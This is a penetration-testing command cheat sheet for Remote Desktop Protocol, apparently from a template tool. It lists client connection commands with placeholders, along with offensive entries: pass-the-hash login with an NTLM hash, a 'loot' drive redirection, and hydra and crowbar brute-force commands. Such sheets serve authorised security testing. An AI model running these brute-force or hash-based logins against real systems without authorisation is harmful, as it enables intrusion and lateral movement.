# RDP
> Remote Desktop Protocol clients for connecting to Windows targets
<!-- tags: rdp,windows,remote-desktop,lateral-movement -->

---

## connect xfreerdp creds
Connect to RDP target with credentials and clipboard support.

```bash
xfreerdp /v:{{TARGET:ip}} /u:{{USERNAME:str}} /p:{{PASSWORD:str}} /cert:ignore /sec:nla +clipboard
```

<!-- meta: risk=low | phase=exploit | tags=rdp,xfreerdp -->

---

## connect xfreerdp pass-the-hash NTLM
Authenticate to RDP using NTLM hash (no plaintext password).

```bash
xfreerdp /v:{{TARGET:ip}} /u:{{USERNAME:str}} /pth:{{NTHASH:str}} /cert:ignore
```

<!-- meta: risk=med | phase=exploit | tags=rdp,pth,ntlm -->

---

## connect xfreerdp domain drive
Connect with domain credentials and full screen drive redirection.

```bash
xfreerdp /v:{{TARGET:ip}} /u:{{USERNAME:str}} /p:{{PASSWORD:str}} /d:{{DOMAIN:domain}} /cert:ignore /drive:loot,/tmp/loot /dynamic-resolution
```

<!-- meta: risk=low | phase=post | tags=rdp,domain,drive-redir -->

---

## connect rdesktop legacy
Connect with rdesktop client (older protocol support).

```bash
rdesktop -u {{USERNAME:str}} -p {{PASSWORD:str}} -d {{DOMAIN:domain}} {{TARGET:ip}}
```

<!-- meta: risk=low | phase=exploit | tags=rdp,rdesktop -->

---

## connect remmina uri
Launch Remmina with full RDP URI.

```bash
remmina -c rdp://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}
```

<!-- meta: risk=low | phase=exploit | tags=rdp,remmina,gui -->

---

## connect krdc
Open RDP session in KRDC client.

```bash
krdc rdp://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}
```

<!-- meta: risk=low | phase=exploit | tags=rdp,krdc -->

---

## connect vinagre
Open RDP session in Vinagre client.

```bash
vinagre rdp://{{TARGET:ip}}
```

<!-- meta: risk=low | phase=exploit | tags=rdp,vinagre -->

---

## brute rdp hydra
Brute force RDP service with credential lists.

```bash
hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} rdp://{{TARGET:ip}}
```

<!-- meta: risk=high | phase=passwords | tags=rdp,bruteforce,hydra -->

---

## brute rdp crowbar nla
Use crowbar for RDP brute force (handles NLA better).

```bash
crowbar -b rdp -s {{TARGET:ip}}/32 -U {{USERS_FILE:file:users.txt}} -C {{PASSWORDS_FILE:file:passwords.txt}}
```

<!-- meta: risk=high | phase=passwords | tags=rdp,crowbar,nla -->
